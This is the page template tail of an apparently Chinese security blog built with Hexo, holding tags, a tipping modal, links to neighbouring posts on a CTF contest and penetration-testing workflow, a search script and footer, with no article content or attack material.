                                <a href="/tags/web%E6%B8%97%E9%80%8F/">
                                    <span class="chip bg-color">web渗透</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/01/24/ctf-shua-ti-zhi-lu/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="CISCN国赛">
                        
                        <span class="card-title">CISCN国赛</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-01-24
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="渗透测试流程&amp;外网打点">
                        
                        <span class="card-title">渗透测试流程&amp;外网打点</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-12-31
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
                                    内网渗透
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">内网渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
